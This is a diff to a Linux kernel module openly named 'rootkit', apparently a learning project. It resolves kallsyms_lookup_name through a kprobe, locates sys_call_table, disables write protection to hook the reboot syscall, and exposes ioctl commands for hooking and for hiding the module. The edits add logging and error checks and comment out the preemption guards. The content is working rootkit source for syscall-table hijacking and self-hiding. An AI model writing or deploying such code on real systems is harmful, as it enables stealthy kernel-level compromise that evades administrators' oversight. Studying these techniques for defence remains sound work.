@@ -3,10 +3,9 @@
 #include <linux/fs.h>
 #include <linux/cdev.h>
 #include <linux/kprobes.h>
+#include <linux/kallsyms.h>
 
 #include "rootkit.h"
-
-#define OURMODNAME	"rootkit"
 
 static int major;
 struct cdev *kernel_cdev;
@@ -18,7 +17,7 @@ static struct list_head *prev_module;
 /****** hook ******/
 static bool hooked;
 static struct kprobe kp = {
-	.symbol_name = "kallsyms_lookup_name"
+    .symbol_name = "kallsyms_lookup_name",
 };
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 unsigned long *sys_call_table_;
@@ -56,7 +55,6 @@ const struct file_operations fops = {
     	owner:THIS_MODULE
 };
 
-
 static void hide_rootkit(void)
 {
     	pr_info("rootkit: hiding rootkit!\n");
@@ -84,12 +82,17 @@ static unsigned long kprobe_lookup_symbol(const char *name)
 {
 	static kallsyms_lookup_name_t kallsyms_lookup_name;
 	kallsyms_lookup_name = NULL;
+	int ret = 0;
 
 	if(!kallsyms_lookup_name) {
-		register_kprobe(&kp);
+		ret = register_kprobe(&kp);
+		if(ret < 0) {
+			pr_info("rootkit: kprobe failed: %d\n", ret);
+		}
 		kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 		unregister_kprobe(&kp);
 	}
+	pr_info("rootkit: lookup %s\n", name);
 	return kallsyms_lookup_name(name);
 }
 
@@ -145,7 +148,7 @@ static int rootkit_hook(void)
 		pr_info("rootkit: Start hooking syscalls.\n");
 		sys_call_table_ = 
 			(unsigned long *)kprobe_lookup_symbol("sys_call_table");
-		preempt_disable();
+		//preempt_disable();
 		write_protection_disable();
 
 		orig_reboot = (void *)sys_call_table_[__NR_reboot];
@@ -153,8 +156,9 @@ static int rootkit_hook(void)
 		sys_call_table_[__NR_reboot] = (long)hook_reboot;
 
 		write_protection_enable();
-		preempt_enable();
+		//preempt_enable();
 		hooked = true;
+		pr_info("rootkit: Hook sucessfully.\n");
 	} else {
 		pr_info("rootkit: Already hooked syscalls.\n");
 	}
@@ -164,13 +168,13 @@ static int rootkit_hook(void)
 static int rootkit_unhook(void)
 {
 	if(hooked) {
-		preempt_disable();
+		//preempt_disable();
 		write_protection_disable();
 
 		sys_call_table_[__NR_reboot] = (unsigned long)orig_reboot;
 		
 		write_protection_enable();
-		preempt_enable();
+		//preempt_enable();
 		hooked = false;
 	} else {
 		pr_info("rootkit: Not hooked syscalls yet.\n");
@@ -187,7 +191,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
 	switch (ioctl) {
 	case IOCTL_MOD_HOOK:
-		pr_info("rootkit: hook.\n");
 		rootkit_hook();
 		break;
 	case IOCTL_MOD_HIDE:
